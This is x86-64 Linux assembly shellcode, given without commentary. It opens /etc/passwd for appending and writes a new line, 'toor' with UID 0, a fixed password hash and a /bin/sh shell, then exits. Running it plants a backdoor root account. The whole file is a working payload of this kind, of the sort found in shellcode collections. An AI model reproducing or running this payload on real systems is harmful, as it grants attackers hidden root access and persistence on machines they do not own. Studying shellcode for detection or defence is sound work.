global _start

section .text
_start:

    xor ebx, ebx
    mul ebx                         
    push rax 
    mov ebx, 0x647773ff             
    shr ebx, 0x08
    push rbx
    mov rbx, 0x7361702f6374652f     
    push rbx 
    mov rdi, rsp                    
    xchg esi, edx                   
    mov si, 0x401                   
    add al, 0x2                     
    syscall                         

    xchg rdi, rax                   
    
    jmp short get_entry_address     
    
write_entry:

    pop rsi                         
    push 0x1                        
    pop rax                         
    push 38                         
    pop rdx                         
    syscall                         
    push 60
    pop rax
    syscall                         
    
get_entry_address:
    call write_entry
    user_entry: db "toor:sXuCKi7k3Xh/s:0:0::/root:/bin/sh",0xa
